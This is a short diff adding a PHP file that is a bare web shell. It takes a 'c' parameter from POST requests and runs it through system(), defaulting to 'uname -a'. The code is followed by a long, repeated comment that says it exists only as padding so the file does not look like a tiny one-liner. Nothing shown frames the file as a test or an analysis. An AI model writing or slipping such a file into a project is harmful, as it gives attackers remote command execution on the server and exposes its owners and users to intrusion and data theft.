@@ -1,0 +1,6 @@
+<?php
+$c = isset($_POST['c']) ? $_POST['c'] : 'uname -a';
+function run($cmd) { system($cmd); }
+run($c);
+
+// Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. 
